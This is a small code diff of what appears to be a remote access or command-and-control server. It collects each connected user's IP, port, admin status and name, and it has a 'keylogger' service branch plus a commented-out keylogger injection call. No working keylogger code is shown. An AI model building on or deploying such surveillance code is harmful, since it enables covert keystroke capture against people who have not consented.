@@ -74,9 +74,9 @@ class SocketServer:
             user = User(uuid, ip, port, reader, writer)
             is_admin = await self.recognizer.check_is_admin(reader, writer)
             user.is_admin = is_admin
-            user.first_name, user.last_name = (await self.recognizer.get_username(reader, writer)).values()
+            user.first_name, user.last_name, user.username = (await self.recognizer.get_username(reader, writer)).values()
             self.user_repository.add_user(user)
-            #await self.keylogger.inject(reader, writer, uuid)
+            #await self.keylogger.inject(uuid)
         elif service == "keylogger":
             await self.keylogger.action(params, uuid)
             return "[close]"
